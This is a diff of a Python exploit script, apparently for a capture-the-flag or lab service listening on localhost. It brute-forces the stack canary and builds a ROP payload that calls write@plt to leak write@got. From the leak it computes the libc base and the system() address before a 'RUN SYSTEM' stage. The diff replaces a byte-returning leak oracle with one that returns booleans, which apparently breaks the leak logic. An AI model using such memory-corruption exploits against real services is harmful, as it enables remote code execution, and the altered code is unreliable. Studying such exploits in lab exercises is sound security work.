@@ -50,7 +50,7 @@ def oracle(username=b'toto', data=b'', timeout=0.5):
 		s.send(pack("<H", len(buf)));
 		s.send(buf)
 		rep = s.recv(len(buf));
-		# print ("Server pong : %s"%repr(rep))
+		print ("Server pong : %s"%repr(rep))
 
 		if rep != buf:
 			print ("Bad pong reply")
@@ -70,36 +70,6 @@ def oracle(username=b'toto', data=b'', timeout=0.5):
 		return False
 
 	return True
-def leak_oracle(username=b'toto', data=b'', timeout=0.5):
-    try:
-        s = S.socket(S.AF_INET, S.SOCK_STREAM)
-        if timeout:
-            s.settimeout(timeout)
-
-        s.connect(('127.0.0.1', 55555))
-
-        # Hello
-        s.send(pack("<H", 0))
-        s.send(username)
-        s.recv(100)
-
-        # Ping-pong
-        s.send(pack("<H", 1))
-
-        buf = b'A' * 1024 + data
-
-        s.send(pack("<H", len(buf)))
-        s.send(buf)
-
-        # Return the actual server response
-        rep = s.recv(len(buf))
-
-        s.close()
-        return rep
-
-    except Exception as e:
-        print("Leak exception:", e)
-        return b''
 
 def bruteforce_stack(size, i):
     data = b''
@@ -447,6 +417,32 @@ def main():
 
             print(f"write@got = {write_got:#010x}")
 
+            #
+
+            # Stack:
+
+            #
+
+            # canary
+
+            # ebx
+
+            # esi
+
+            # ebp
+
+            # write@plt
+
+            # fake return
+
+            # fd
+
+            # write@got
+
+            # 4
+
+            #
+
             payload = pack(
 
                 "<IIIIIIIII",
@@ -477,7 +473,7 @@ def main():
 
             username = input("username: ").encode()
 
-            result = leak_oracle(
+            result = oracle(
 
                 username=username,
 
@@ -485,17 +481,31 @@ def main():
 
             )
 
-            print("Server response:", repr(result))
+            print("Server response:", result)
 
-            if len(result) < 4:
+            #
 
-                print("Not enough bytes received for leak.")
+            # The oracle response should contain the
+
+            # 4-byte leaked write address.
+
+            #
+
+            if isinstance(result, bytes):
+
+                if len(result) < 4:
+
+                    print("Not enough bytes received for leak.")
+
+                    continue
+
+                leak = result[:4]
+
+            else:
+
+                print("Oracle result is not bytes.")
 
                 continue
-
-            leak = result[:4]
-
-            print("Leaked bytes:", hexlify(leak).decode())
 
             leaked_write = unpack("<I", leak)[0]
 
@@ -510,6 +520,7 @@ def main():
             print(f"libc base     = {libc_base:#010x}")
 
             print(f"system        = {system_addr:#010x}")
+
         # ---------------------------------------------------------
 
         # ATTACK 2: RUN SYSTEM
